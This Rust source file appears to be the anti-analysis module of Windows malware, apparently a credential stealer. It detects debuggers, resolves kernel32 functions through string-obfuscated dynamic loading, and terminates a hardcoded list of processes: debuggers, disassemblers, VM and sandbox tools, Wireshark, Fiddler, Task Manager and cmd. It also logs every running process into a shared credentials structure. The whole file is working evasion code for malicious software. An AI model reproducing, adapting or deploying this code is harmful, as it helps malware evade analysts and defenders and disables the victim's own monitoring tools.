use obfstr::obfstr as obf;
use goldberg::goldberg_stmts;
use std::sync::{Arc, Mutex};

use winapi::um::tlhelp32::{LPPROCESSENTRY32, TH32CS_SNAPPROCESS, PROCESSENTRY32};
use winapi::um::winnt::HANDLE;
use winapi::um::handleapi::INVALID_HANDLE_VALUE;

use crate::global::{utils::{Credentials, char_arr_to_string}, loader};

pub fn is_debugger_present() -> bool{
    let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
    let is_debugger_present = loader::call_function!(&handle, fn() -> i32, obf!("IsDebuggerPresent"));

    if is_debugger_present() == 1 {
        return true;
    }
    false
}

pub fn output_debug_string() -> bool {
    let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
    let output_debug_string = loader::call_function!(&handle, fn(*const i8) -> i32, obf!("OutputDebugStringA"));
    let set_last_error = loader::call_function!(&handle, fn(u32) -> (), obf!("SetLastError"));
    let get_last_error = loader::call_function!(&handle, fn() -> u32, obf!("GetLastError"));

    set_last_error(0);
    output_debug_string(obf!("Hello, debugger\0").as_ptr() as *const i8);
    if get_last_error() != 0 {
        return true;
    }
    false
}

pub struct ProcessInformation {
    pub pid: u32,
    pub name: String,
}

impl ProcessInformation {
    fn new(_pid: u32, _name: String) -> ProcessInformation {
        ProcessInformation { pid: _pid, name: _name }
    }
}

pub struct ProcessInformationIterator {
    process_information: ProcessInformation,
    index: usize,
    process_snapshot: HANDLE,
    process_entry: PROCESSENTRY32,

}

impl ProcessInformationIterator {
    pub fn new() -> ProcessInformationIterator {
        let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
        let create_toolhelp32_snapshot = loader::call_function!(&handle, fn(u32, u32) -> HANDLE, obf!("CreateToolhelp32Snapshot"));
        let process32_first = loader::call_function!(&handle, fn(HANDLE, LPPROCESSENTRY32) -> i32, obf!("Process32First"));
    
        let h_process_snapshot: HANDLE = create_toolhelp32_snapshot(TH32CS_SNAPPROCESS, 0);
        if h_process_snapshot == INVALID_HANDLE_VALUE {
            return ProcessInformationIterator { process_information: ProcessInformation::new(0, String::from("")), index: 0, process_snapshot: h_process_snapshot, process_entry: PROCESSENTRY32 { dwSize: 0, cntUsage: 0, th32ProcessID: 0, th32DefaultHeapID: 0, th32ModuleID: 0, cntThreads: 0, th32ParentProcessID: 0, pcPriClassBase: 0, dwFlags: 0, szExeFile: [0; 260] }};
        }
        let mut pe: PROCESSENTRY32;
        unsafe {
            pe = ::std::mem::zeroed();
        }
        let a = ::std::mem::size_of::<PROCESSENTRY32>();

        let lppe: LPPROCESSENTRY32 = &mut pe;
        pe.dwSize = a as u32;
        let res = process32_first(h_process_snapshot, lppe);
        if res == 0 {
            return ProcessInformationIterator { process_information: ProcessInformation::new(0, String::from("")), index: 0, process_snapshot: h_process_snapshot, process_entry: PROCESSENTRY32 { dwSize: 0, cntUsage: 0, th32ProcessID: 0, th32DefaultHeapID: 0, th32ModuleID: 0, cntThreads: 0, th32ParentProcessID: 0, pcPriClassBase: 0, dwFlags: 0, szExeFile: [0; 260] }};
        }

        let pid: u32 = pe.th32ProcessID;
        let process_name: String = char_arr_to_string(&pe.szExeFile);
        ProcessInformationIterator { process_information: ProcessInformation::new(pid, process_name), index: 0, process_snapshot: h_process_snapshot, process_entry: pe }
    }
}

impl Iterator for ProcessInformationIterator {
    type Item = ProcessInformation;

    fn next(&mut self) -> Option<<Self as Iterator>::Item> {
        let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
        let process32_next = loader::call_function!(&handle, fn(HANDLE, LPPROCESSENTRY32) -> i32, obf!("Process32Next"));

        self.index = self.index + 1;
        if self.index == 1 {
            return Some(ProcessInformation::new(self.process_information.pid, self.process_information.name.clone()));
        }

        let mut pe = self.process_entry;
        let lppe = &mut pe;
        let res;
        unsafe {
            (*lppe).szExeFile = ::std::mem::zeroed();
            res = process32_next(self.process_snapshot, lppe);
        }
        if res != 1 { // No more processes, finish the iteration
            None
        } else {
            let pid: u32 = (*lppe).th32ProcessID;
            let process_name: String = char_arr_to_string(&(*lppe).szExeFile);
            Some(ProcessInformation::new(pid, process_name))
        }
    }
}

pub fn get_kill_process(creds :  &Arc<Mutex<Credentials>>) -> bool {
    goldberg_stmts! {
        let blacklisted_processes: Vec<String> = vec![
            String::from(obf!("httpdebuggerui")),
            String::from(obf!("wireshark")),
            String::from(obf!("fiddler")),
            String::from(obf!("regedit")),
            String::from(obf!("cmd")),
            String::from(obf!("taskmgr")),
            String::from(obf!("vboxservice")),
            String::from(obf!("df5serv")),
            String::from(obf!("processhacker")),
            String::from(obf!("vboxtray")),
            String::from(obf!("vmtoolsd")),
            String::from(obf!("vmwaretray")),
            String::from(obf!("VMwareService")),
            String::from(obf!("ida64")),
            String::from(obf!("ida")),
            String::from(obf!("idag64")),
            String::from(obf!("idag")),
            String::from(obf!("idaw")),
            String::from(obf!("idaq")),
            String::from(obf!("idaq64")),
            String::from(obf!("idau")),
            String::from(obf!("idau64")),
            String::from(obf!("ollydbg")),
            String::from(obf!("pestudio")),
            String::from(obf!("vmwareuser")),
            String::from(obf!("vgauthservice")),
            String::from(obf!("vmacthlp")),
            String::from(obf!("x96dbg")),
            String::from(obf!("vmsrvc")),
            String::from(obf!("x32dbg")),
            String::from(obf!("x64dbg")),
            String::from(obf!("vmusrvc")),
            String::from(obf!("prl_cc")),
            String::from(obf!("prl_tools")),
            String::from(obf!("xenservice")),
            String::from(obf!("qemu-ga")),
            String::from(obf!("joeboxcontrol")),
            String::from(obf!("ksdumperclient")),
            String::from(obf!("ksdumper")),
            String::from(obf!("joeboxserver")),
            String::from(obf!("scylla")),
            String::from(obf!("scylla_x64")),
            String::from(obf!("scylla_x86")),
            String::from(obf!("protection_id")),
            String::from(obf!("32dbg")),
            String::from(obf!("64dbg")),
            String::from(obf!("windbg")),
            String::from(obf!("reshacker")),
            String::from(obf!("ImportREC")),
            String::from(obf!("IMMUNITYDEBUGGER")),
            String::from(obf!("devenv")),

        ];
    }
    
    let mut process_list = Vec::new();

    for process_information in ProcessInformationIterator::new() {
        if blacklisted_processes.contains(&process_information.name) {
            crate::global::utils::prockill(process_information.pid, 1);
        }
        process_list.push(process_information.name);
    }

    creds.lock().unwrap().proc_list = process_list;
    false
}
